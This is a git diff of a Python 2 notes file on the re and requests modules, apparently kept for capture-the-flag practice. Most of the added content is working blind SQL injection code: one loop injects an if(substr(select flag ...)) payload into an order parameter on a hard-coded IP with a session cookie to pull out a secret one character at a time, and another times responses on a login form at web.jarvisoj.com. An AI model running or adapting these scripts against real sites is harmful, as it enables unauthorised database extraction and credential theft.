@@ -2,6 +2,11 @@
 # Mainly devided into two aspects, one is the method of using models,another is integrated function
 # 1.models 
 
+# [re]
+import re
+s='1021533940@qq.com'
+r = re.findall('^\d{9,11}@(?:qq|pp|aa)\.(?:com|sina|cn)$',s)
+print r
 
 # [requests]
 url = 'http://4ct10n.cn'
@@ -233,8 +238,25 @@ for i in range(1,33):
             string+=j
             break
     print string 
+#--------------------------------------------------
+import requests
+cookies={
+        'PHPSESSID': 'i6vl5rbtr5r8gsiu5cl6bfi8g7'
+}
 
-# blind sqlinjection based different content
+
+string = ''
+for i in range(1,33):
+    for j in range(32,127):
+        url='http://202.120.7.197/app.php?action=search&keyword=&order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{},1)like({}),price,name)'.format(str(i),hex(j))
+        s=requests.get(url=url , cookies=cookies)
+        content=s.content
+        if content.find('5') == 102 and '%' != chr(j) :
+            string+=chr(j)
+            break
+    print string 
+
+# blind sqlinjection based different time
 
 import requests
 url=r'http://web.jarvisoj.com:32787/login.php'
@@ -248,8 +270,13 @@ for i in range(1,33):
             'password': 1
         }
         print j
+
         s=requests.post(url=url,data=data)
         sec=s.elapsed.seconds
+        # try:
+        #     s=requests.post(url=url , cookies=cookies,data=data,timeout=2)
+        # except Exception as e:
+        #     strings = strings +chr(j)
         if sec > 2:
             string+=j
             break
